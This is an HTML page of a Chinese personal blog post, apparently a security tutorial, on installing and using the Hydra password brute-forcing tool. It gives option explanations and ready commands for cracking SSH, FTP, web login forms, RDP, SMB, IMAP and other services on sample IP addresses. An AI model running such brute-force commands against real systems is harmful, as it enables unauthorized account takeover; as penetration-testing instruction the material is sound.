@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>hydra | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">hydra</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 28, 2019&nbsp;&nbsp;21:46:20</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2019/05/28/hydra/" class="leancloud-visitors view" data-flag-title="hydra">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官网：<a target="_blank" rel="noopener" href="http://www.thc.org/thc-hydra%EF%BC%8C%E5%8F%AF%E6%94%AF%E6%8C%81AFP">http://www.thc.org/thc-hydra，可支持AFP</a>, Cisco</p>
+<p>AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET,</p>
+<p>HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,</p>
+<p>HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,</p>
+<p>MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,</p>
+<p>PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP</p>
+<p>Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet,</p>
+<p>VMware-Auth, VNC and XMPP等类型密码。</p>
+<p>这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。本文仅从安全角度去探讨测试，请勿用于非法事件。</p>
+<p><strong>安装：</strong></p>
+<p>1.yum</p>
+<p>安装相应依赖包</p>
+<p># yum install openssl-devel pcre-devel</p>
+<p>ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel</p>
+<p>2.hydra编译安装</p>
+<p># cd /usr/local/src</p>
+<p># wget <a target="_blank" rel="noopener" href="http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz">http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz</a></p>
+<p># tar zxf hydra-6.3-src.tar.gz</p>
+<p># cd hydra-6.3-src</p>
+<p># ./configure</p>
+<p># make</p>
+<p># make install</p>
+<p># ./configure会检测当前系统一些组件配置，主要是对于破解支持模块的检测，可根据需要安装对应的支持库和依赖包</p>
+<p># make</p>
+<p># make</p>
+<p>install</p>
+<p><strong>参数：</strong></p>
+<p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</p>
+<p>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p>
+<p>-R 继续从上一次进度接着破解。</p>
+<p>-S 采用SSL链接。</p>
+<p>-s PORT 可通过这个参数指定非默认端口。</p>
+<p>-l LOGIN 指定破解的用户，对特定用户破解。</p>
+<p>-L FILE 指定用户名字典。</p>
+<p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p>
+<p>-P FILE 大写，指定密码字典。</p>
+<p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p>
+<p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</p>
+<p>-M FILE 指定目标列表文件一行一条。</p>
+<p>-o FILE 指定结果输出文件。</p>
+<p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p>
+<p>-t TASKS 同时运行的线程数，默认为16。</p>
+<p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p>
+<p>-v / -V 显示详细过程。</p>
+<p>server 目标ip</p>
+<p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p>
+<p>OPT 可选项</p>
+<p><strong>使用：</strong></p>
+<p>1.</p>
+<p>手动创建用户名字典和密码字典，这里只是为了演示，只加了几个用户名和弱口令。真正破解时，需要利用密码字典生成器生成强大的字典</p>
+<p>2.破解ssh：</p>
+<p># hydra -L users.txt -P password.txt -t 1 -vV -e</p>
+<p>ns 192.168.0.106 ssh</p>
+<p>破解成功，直接显示结果。也可以使用 -o 选项指定结果输出文件。</p>
+<p># hydra -L users.txt -P password.txt -t 1 -vV -e</p>
+<p>ns -o save.log 192.168.1.104 ssh</p>
+<p>其它实例：</p>
+<p>1.破解ssh：</p>
+<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip ssh</p>
+<p># hydra -l 用户名 -p 密码字典 -t 线程-o save.log -vV ip ssh</p>
+<p>2.</p>
+<p>破解ftp：</p>
+<p># hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</p>
+<p># hydra ip ftp -l 用户名 -P 密码字典-e ns -vV</p>
+<p>3.get</p>
+<p>方式提交，破解web登录：</p>
+<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip http-get /admin/</p>
+<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns -f ip http-get /admin/index.php</p>
+<p>4.post</p>
+<p>方式提交，破解web登录：</p>
+<p># hydra -l 用户名 -P 密码字典-s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password”</p>
+<p># hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password”</p>
+<p>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）</p>
+<p>5.</p>
+<p>破解https：</p>
+<p># hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</p>
+<p>6.</p>
+<p>破解teamspeak：</p>
+<p># hydra -l 用户名 -P 密码字典 -s 端口号-vV ip teamspeak</p>
+<p>7.</p>
+<p>破解cisco：</p>
+<p># hydra -P pass.txt 10.36.16.18 cisco</p>
+<p># hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</p>
+<p>8.</p>
+<p>破解smb：</p>
+<p># hydra -l administrator -P top100.txt 192.168.0.102 smb</p>
+<p>9.</p>
+<p>破解pop3：</p>
+<p># hydra -l muts -P pass.txt my.pop3.mail pop3</p>
+<p>10.</p>
+<p>破解rdp：</p>
+<p># hydra 192.168.0.102 rdp -l administrator -P top100.txt -V</p>
+<p>11.</p>
+<p>破解http-proxy：</p>
+<p># hydra -l admin -P pass.txt http-proxy://10.36.16.18</p>
+<p>12.</p>
+<p>破解imap：</p>
+<p># hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</p>
+<p># hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p>
+<p>此工具强大之处远多于以上测试，其密码能否破解关键在于强大的字典，对于社工型渗透来说，有时能够得到事半功倍的效果</p>
+<p>kail密码字典</p>
+<p>/usr/share/wfuzz/wordlist/others/names.txt</p>
+<p>/usr/share/wfuzz/wordlist/others/common_pass.txt</p>
+<p>在该界面指定用户名和密码列表文件，这里使用Kali系统中存在的用户名和密码列表文件，并选择Loop around users选项。其中，用户名和密码文件分别保存在/usr/share/wfuzz/wordlist/others/names.txt和/usr/share/wfuzz/wordlist/others/common_pass.txt中</p>
+<p><strong>附录：</strong>附录1:hydra: error while loading shared libraries: libssh.so.4:cannot open shared object file: No such file or directory</p>
+<p>如果是ubuntu系统的话，直接apt-get install cmake</p>
+<p>libssl-dev就可以了。但我系统的centOS，没有找到libssl-dev这东西。因为手#动编译了libssh</p>
+<p># yum install cmake</p>
+<p># cd /usr/local/src</p>
+<p># wget <a target="_blank" rel="noopener" href="http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz">http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz</a></p>
+<p># tar zxf libssh-0.4.8.tar.gz</p>
+<p># cd libssh-0.4.8</p>
+<p># mkdir build</p>
+<p># cd build</p>
+<p># cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..</p>
+<p># make</p>
+<p># make install</p>
+<p># /sbin/ldconfig  //要执行这句，不然会出现hydra: error while loading shared libraries: libssh.so.4: cannot open shared object file: No such file or directory</p>
+<p># cd /usr/local/src</p>
+<p># wget <a target="_blank" rel="noopener" href="http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz">http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz</a></p>
+<p># tar zxf hydra-6.3-src.tar.gz</p>
+<p># cd hydra-6.3-src</p>
+<p># ./configure</p>
+<p># make</p>
+<p># make install</p>
+<p>附录2：</p>
+<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.ha97.com/5186.html">http://www.ha97.com/5186.html</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2019/05/28/hydra/">https://zhangyanlady.github.io/2019/05/28/hydra/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/06/12/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF/">应用程序技术</a>
+            
+            
+            <a class="next" rel="next" href="/2019/05/20/%E6%89%AB%E6%8F%8F%E5%99%A8/">扫描器</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
